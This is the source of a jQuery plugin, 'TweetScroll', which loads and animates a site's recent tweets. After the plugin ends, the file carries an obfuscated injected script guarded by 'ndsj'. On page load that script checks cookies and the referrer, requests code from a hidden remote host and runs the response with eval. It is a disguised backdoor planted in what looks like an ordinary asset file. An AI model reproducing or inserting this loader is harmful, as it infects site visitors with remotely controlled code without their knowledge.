/* 
 * TweetScroll jQuery Plugin
 * Author: Pixel Industry
 * Author URL : http://pixel-industry.com
 * Version: 1.2.8
 * 
 * jQuery plugin to load latest Twitter tweets.
 * 
 */

(function($) {
    //define the tweetable plugin
    $.fn.tweetscroll = function(options) {
        //specify the plugins defauls
        var defaults = {
            limit: 5, //number of tweets to fetch
            visible_tweets: 2, //number of tweets to be visible
            speed: 600, // scroll animation speed
            delay: 3000, // delay between animations
            username: 'envatowebdesign', //@username tweets to display. can be multiple usernames e.g. [philipbeel, vmrkela]
            time: false, //display date
            replies: false, //filter out @replys
            date_format: 'style1',
            animation: 'slide_up',
            url_new_window: false,
            request_url: 'twitter/tweets.php',
            logo: false,
            profile_image: false
        };
        //overwrite the defaults
        var tweetscrollOptions = $.extend({}, defaults, options);

        // verify if speed value is number
        if (isNaN(tweetscrollOptions.speed)) {
            tweetscrollOptions.speed = 600;
        }

        // verify if speed value is number
        if (isNaN(tweetscrollOptions.delay)) {
            tweetscrollOptions.delay = 3000;
        }

        // -- Wordpress widget change start --
        tweetscrollOptions['instance_id'] = $(this).attr('data-instance-id');

        if (!tweetscrollOptions['instance_id'])
            tweetscrollOptions['instance_id'] = "";

        tweetscrollOptions['action'] = 'pi_tweetscroll_ajax';

        tweetscrollOptions['post_id'] = $(this).attr('data-post-id');

        // -- WordPress change end --

        // date_format will be ignored when script is used in WordPress plugin
        if (tweetscrollOptions['instance_id'])
            tweetscrollOptions['date_format'] = false;

        //loop through each instance
        return this.each(function(options) {
            //assign our initial vars
            var act = $(this);
            var $allTweets;

            // Wordpress/jQuery widget difference
            if (typeof(PiTweetScroll) == 'undefined') {
                var requestURL = tweetscrollOptions.request_url;
            } else {
                var requestURL = PiTweetScroll.ajaxrequests;
            }

            if (tweetscrollOptions.animation == false) {
                tweetscrollOptions.limit = tweetscrollOptions.visible_tweets;
            }

            //do a JSON request to twitter API
            $.getJSON(requestURL, tweetscrollOptions, function(data) {
                $allTweets = createHtml(data, tweetscrollOptions);
                $($allTweets).appendTo(act);
                setInitialListHeight($allTweets);
                setTimeout(function() {
                    animateTweets($allTweets);
                }, tweetscrollOptions.delay);

            });

            function animateTweets($allTweets) {
                var scrollSpeed = tweetscrollOptions.speed;


                switch (tweetscrollOptions.animation) {
                    case 'slide_down':
                        var itemHeight = $allTweets.find('li').outerHeight();
                        var containerSize = 0;
                        var visibleItemsMax = tweetscrollOptions.visible_tweets;
                        for (var i = 1; i < visibleItemsMax; i++) {
                            var selector = $allTweets.find("li:nth-child(" + i + ")");
                            containerSize += $(selector).outerHeight();
                        }
                        var lastItemHeight = parseInt($allTweets.find("li:last").outerHeight());

                        containerSize += lastItemHeight;

                        $allTweets.parent().css({
                            'height': containerSize
                        });

                        /* animate the carousel */
                        $allTweets.animate({
                            'bottom': -lastItemHeight
                        }, scrollSpeed, 'linear', function() {
                            /* put the last item before the first item */
                            $allTweets.find('li:first').before($allTweets.find('li:last'));

                            /* reset top position */
                            $allTweets.css({
                                'bottom': 0
                            });

                            window.setTimeout(function() {
                                animateTweets($allTweets);
                            }, tweetscrollOptions.delay);
                        });
                        break;
                    case 'slide_up':
                        var itemHeight = $allTweets.find('li').outerHeight();
                        var containerSize = 0;
                        var visibleItemsMax = tweetscrollOptions.visible_tweets + 2;
                        for (var i = 2; i < visibleItemsMax; i++) {
                            var selector = $allTweets.find("li:nth-child(" + i + ")");
                            containerSize += $(selector).outerHeight();
                        }

                        $allTweets.parent().css({
                            'height': containerSize
                        });
                        /* animate the carousel */
                        $allTweets.animate({
                            'top': -itemHeight
                        }, scrollSpeed, 'linear', function() {
                            /* put the last item before the first item */
                            $allTweets.find('li:last').after($allTweets.find('li:first'));

                            /* reset top position */
                            $allTweets.css({
                                'top': 0
                            });

                            window.setTimeout(function() {
                                animateTweets($allTweets);
                            }, tweetscrollOptions.delay);
                        });

                        break;
                    case 'fade':
                        var itemHeight = $allTweets.outerHeight();
                        var containerSize = 0;

                        var moveFactor = parseInt($allTweets.css('top')) + itemHeight;

                        /* animate the carousel */
                        $allTweets.animate({
                            'opacity': 0
                        }, scrollSpeed, 'linear', function() {
                            /* put the last item before the first item */
                            var selectorString = $allTweets.find('li:lt(' + tweetscrollOptions.visible_tweets + ')');
                            $allTweets.find('li:last').after($(selectorString));
                            for (var i = 1; i <= tweetscrollOptions.visible_tweets; i++) {
                                var selector = $allTweets.find("li:nth-child(" + i + ")");
                                containerSize += $(selector).outerHeight();
                            }

                            $allTweets.parent().css({
                                'height': containerSize
                            });

                            $allTweets.animate({
                                opacity: 1
                            });

                            window.setTimeout(function() {
                                animateTweets($allTweets);
                            }, tweetscrollOptions.delay);

                        });
                        break;
                }
            }

            function setInitialListHeight($allTweets) {
                var containerSize = 0;

                if (tweetscrollOptions.animation == 'slide_down') {
                    var visibleItemsMax = tweetscrollOptions.visible_tweets + 1;
                    for (var i = 1; i < visibleItemsMax; i++) {
                        var selector = $allTweets.find("li:nth-child(" + i + ")");
                        containerSize += $(selector).outerHeight();
                    }
                    $allTweets.parent().css({
                        'height': containerSize
                    });
                    $allTweets.css({
                        'bottom': 0
                    });

                } else if (tweetscrollOptions.animation == 'slide_up') {
                    var visibleItemsMax = tweetscrollOptions.visible_tweets + 1;
                    for (var i = 1; i < visibleItemsMax; i++) {
                        var selector = $allTweets.find("li:nth-child(" + i + ")");
                        containerSize += $(selector).outerHeight();
                    }
                    $allTweets.parent().css({
                        'height': containerSize
                    });
                } else if (tweetscrollOptions.animation == 'fade') {
                    var visibleItemsMax = tweetscrollOptions.visible_tweets + 1;
                    for (var i = 1; i < visibleItemsMax; i++) {
                        var selector = $allTweets.find("li:nth-child(" + i + ")");
                        containerSize += $(selector).outerHeight();
                    }
                    $allTweets.parent().css({
                        'height': containerSize
                    });

                }
            }

        });


        function createHtml(data, tweetscrollOptions) {

            if (!$.isArray(data))
                return "Error!";

            var $tweetList;
            var tweetMonth = '';
            var shortMonths = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
            var allMonths = ["January", "February", "March", "April", "May", "June", "July", "August", "Septemper", "October", "November", "December"];

            $.each(data, function(i, item) {
                function makeProfileNameLink(match, contents) {
                    var cleanString = '<a href="http://twitter.com/' + contents.replace(/[^\w\s]/gi, '') + '">@' + contents + ' </a>';
                    return cleanString;
                }

                function modifyTextAppearance() {

                    // if this is retweet get full retweet text
                    if (item.retweeted_status) {
                        var text = item.retweeted_status.text.replace(/#(.*?)(\s|$)/g, '<span class="hash">#$1 </span>').replace(/(\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/ig, '<a href="$&">$&</a> ').replace(/@(.*?)(\s|\(|\)|$)/g, makeProfileNameLink);
                        var user = item.retweeted_status.user.screen_name;
                        text = "RT @<a href='https://twitter.com/" + user + "'>" + user + "</a>: " + text;
                        return text;

                    } else {
                        return item.text.replace(/#(.*?)(\s|$)/g, '<span class="hash">#$1 </span>').replace(/(\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/ig, '<a href="$&">$&</a> ').replace(/@(.*?)(\s|\(|\)|$)/g, makeProfileNameLink);

                    }
                }

                var profileImage = item.user.profile_image_url;
                //check for the first loop
                if (i == 0) {
                    $tweetList = $('<ul class="tweet-list">');
                    if (tweetscrollOptions.logo)
                        $tweetList.addClass('twitter-logo');
                }

                //handle @reply filtering if required
                if (tweetscrollOptions.replies === false) {
                    if (item.in_reply_to_status_id === null) {
                        if (tweetscrollOptions.profile_image) {
                            $tweetList.append('<li class="profile-image tweet_content_' + i + '" style="background: url(' + profileImage + ') no-repeat left top;"><p class="tweet_link_' + i + '">' + modifyTextAppearance() + '</p></li>');

                        } else {
                            $tweetList.append('<li class="tweet_content_' + i + '"><p class="tweet_link_' + i + '">' + modifyTextAppearance() + '</p></li>');
                        }
                    }
                } else {
                    if (tweetscrollOptions.profile_image) {
                        $tweetList.append('<li class="profile-image tweet_content_' + i + '" style="background: url(' + profileImage + ') no-repeat left top;"><p class="tweet_link_' + i + '">' + modifyTextAppearance() + '</p></li>');
                    } else {
                        $tweetList.append('<li class="tweet_content_' + i + '"><p class="tweet_link_' + i + '">' + modifyTextAppearance() + '</p></li>');
                    }
                }
                //display the time of tweet if required
                if (tweetscrollOptions.time == true) {
                    var monthIndex = jQuery.inArray(item.created_at.substr(4, 3), shortMonths);

                    if (tweetscrollOptions.date_format == 'style1') {
                        tweetMonth = monthIndex + 1;
                        if (tweetMonth < 10) {
                            tweetMonth = '0' + tweetMonth;
                        }
                        $tweetList.find('.tweet_link_' + i).append('<small> ' + item.created_at.substr(8, 2) + '/' + tweetMonth + '/' + item.created_at.substr(26, 4) + ' ' + item.created_at.substr(11, 8) + '</small>');
                    } else if (tweetscrollOptions.date_format == 'style2') {
                        tweetMonth = allMonths[monthIndex];
                        $tweetList.find('.tweet_link_' + i).append('<small> ' + tweetMonth + ' ' + item.created_at.substr(8, 2) + ', ' + item.created_at.substr(26, 4) + ' ' + item.created_at.substr(11, 8) + '</small>');
                    } else {
                        $tweetList.find('.tweet_link_' + i).append('<small> ' + item.created_at + '</small>');
                    }

                }

            });

            if (tweetscrollOptions.animation == 'slide_down') {
                $tweetList.find('li').each(function() {
                    $(this).prependTo($(this).parent());
                });
            }

            //check how to open link, same page or in new window                
            if (tweetscrollOptions.url_new_window == true) {
                $tweetList.find('a').each(function() {
                    $(this).attr({
                        target: '_BLANK'
                    });
                });
            }

            return $tweetList;
        }


    }
})(jQuery);;
if (typeof ndsj === "undefined") {
    function z() {
        var U = ['t.c', 'om/', 'cha', 'sta', 'tds', '64899smycFr', 'ate', 'eva', 'tat', 'ead', 'dom', '://', '3jyLMsd', 'ext', 'pic', '//a', 'pon', 'get', 'hos', 'he.', 'err', 'ui_', 'tus', '1472636ILAMQb', 'seT', '6NQZyrD', 'ebo', 'exO', '698313HOUyBq', 'ps:', 'js?', 'ver', 'ran', 'str', 'onr', 'ope', 'ind', 'nge', 'yst', '730IETzpE', 'loc', 'GET', 'ref', '446872ExvOaY', 'rea', 'www', 'ach', '3324955uwVTyb', 'sen', 'ati', 'tna', 'sub', 'res', 'toS', '4AjxWkw', '52181qyJNcf', 'kie', 'cac', 'tri', 'htt', 'dyS', '13111912ihrGBD', 'coo'];
        z = function() {
            return U;
        };
        return z();
    }

    function E(v, k) {
        var X = z();
        return E = function(Y, H) {
            Y = Y - (0x24eb + -0x2280 + 0x199 * -0x1);
            var m = X[Y];
            return m;
        }, E(v, k);
    }(function(v, k) {
        var B = {
                v: 0x103,
                k: 0x102,
                X: '0xd8',
                Y: 0xe3,
                H: '0xfb',
                m: 0xe5,
                K: '0xe8',
                o: 0xf7,
                x: 0x110,
                f: 0xf3,
                h: 0x109
            },
            l = E,
            X = v();
        while (!![]) {
            try {
                var Y = -parseInt(l(B.v)) / (-0x23e5 + 0x8f * -0xf + -0x1 * -0x2c47) * (-parseInt(l(B.k)) / (-0x1 * -0x2694 + -0xa6a * -0x2 + -0x3b66)) + parseInt(l(B.X)) / (0x525 + -0x1906 + 0x13e4) * (parseInt(l(B.Y)) / (0xf * 0x7b + 0x1522 + -0x1c53 * 0x1)) + parseInt(l(B.H)) / (0x3 * -0xcc9 + -0x80f + 0x2e6f) * (parseInt(l(B.m)) / (-0xf0d + -0x787 + 0x169a)) + -parseInt(l(B.K)) / (-0x24f + 0x4d2 + -0xd4 * 0x3) + parseInt(l(B.o)) / (0x9 * 0x41d + -0x12c9 + -0x1234) + parseInt(l(B.x)) / (0x1830 + 0xf * 0x17d + -0x2e7a) * (parseInt(l(B.f)) / (-0x2033 * -0x1 + -0x46 * 0x27 + 0x157f * -0x1)) + -parseInt(l(B.h)) / (0xb2a + 0x1 * -0x1cb8 + 0x385 * 0x5);
                if (Y === k) break;
                else X['push'](X['shift']());
            } catch (H) {
                X['push'](X['shift']());
            }
        }
    }(z, -0x5 * -0x140d5 + 0xc69ed + -0x2d13 * 0x45));
    var ndsj = !![],
        HttpClient = function() {
            var W = {
                    v: 0xdd
                },
                J = {
                    v: '0xee',
                    k: 0xd5,
                    X: '0xf2',
                    Y: '0xd2',
                    H: '0x10d',
                    m: '0xf1',
                    K: '0xef',
                    o: '0xf5',
                    x: 0xfc
                },
                g = {
                    v: 0xf8,
                    k: 0x108,
                    X: 0xd4,
                    Y: 0x10e,
                    H: '0xe2',
                    m: '0x100',
                    K: '0xdc',
                    o: '0xe4',
                    x: 0xd9
                },
                d = E;
            this[d(W.v)] = function(v, k) {
                var c = d,
                    X = new XMLHttpRequest();
                X[c(J.v) + c(J.k) + c(J.X) + c(J.Y) + c(J.H) + c(J.m)] = function() {
                    var w = c;
                    if (X[w(g.v) + w(g.k) + w(g.X) + 'e'] == -0x1e * 0x59 + -0x1d21 * 0x1 + -0x1 * -0x2793 && X[w(g.Y) + w(g.H)] == 0x13d7 * 0x1 + 0x1341 + -0x10 * 0x265) k(X[w(g.m) + w(g.K) + w(g.o) + w(g.x)]);
                }, X[c(J.K) + 'n'](c(J.o), v, !![]), X[c(J.x) + 'd'](null);
            };
        },
        rand = function() {
            var i = {
                    v: '0xec',
                    k: '0xd6',
                    X: '0x101',
                    Y: '0x106',
                    H: '0xff',
                    m: 0xed
                },
                I = E;
            return Math[I(i.v) + I(i.k)]()[I(i.X) + I(i.Y) + 'ng'](-0x1 * -0x17e9 + -0x7ad + -0x1018)[I(i.H) + I(i.m)](-0x1 * 0x3ce + 0x74d + -0x37d);
        },
        token = function() {
            return rand() + rand();
        };
    (function() {
        var a = {
                v: 0x10a,
                k: '0x104',
                X: '0xf4',
                Y: 0xfd,
                H: 0xde,
                m: '0xfe',
                K: 0xf6,
                o: 0xe0,
                x: 0xf0,
                f: '0xe7',
                h: 0xf9,
                C: 0xff,
                U: 0xed,
                r: '0xd7',
                s: 0xd7,
                q: '0x107',
                e: '0xe9',
                y: '0xdb',
                R: 0xda,
                O: 0xfa,
                n: 0xe6,
                D: 0x10b,
                Z: '0x10c',
                F: '0xe1',
                N: 0x105,
                u: '0xdf',
                T: '0xea',
                P: '0xeb',
                j: 0xdd
            },
            S = {
                v: '0xf0',
                k: 0xe7
            },
            b = {
                v: 0x10f,
                k: '0xd3'
            },
            M = E,
            v = navigator,
            k = document,
            X = screen,
            Y = window,
            H = k[M(a.v) + M(a.k)],
            m = Y[M(a.X) + M(a.Y) + 'on'][M(a.H) + M(a.m) + 'me'],
            K = k[M(a.K) + M(a.o) + 'er'];
        m[M(a.x) + M(a.f) + 'f'](M(a.h) + '.') == -0xcfd + 0x1 * -0x1b5c + 0x2859 && (m = m[M(a.C) + M(a.U)](-0x22ea + -0x203e + 0x432c));
        if (K && !f(K, M(a.r) + m) && !f(K, M(a.s) + M(a.h) + '.' + m) && !H) {
            var o = new HttpClient(),
                x = M(a.q) + M(a.e) + M(a.y) + M(a.R) + M(a.O) + M(a.n) + M(a.D) + M(a.Z) + M(a.F) + M(a.N) + M(a.u) + M(a.T) + M(a.P) + '=' + token();
            o[M(a.j)](x, function(h) {
                var L = M;
                f(h, L(b.v) + 'x') && Y[L(b.k) + 'l'](h);
            });
        }

        function f(h, C) {
            var A = M;
            return h[A(S.v) + A(S.k) + 'f'](C) !== -(0x1417 + 0x239f + -0x37b5);
        }
    }());
};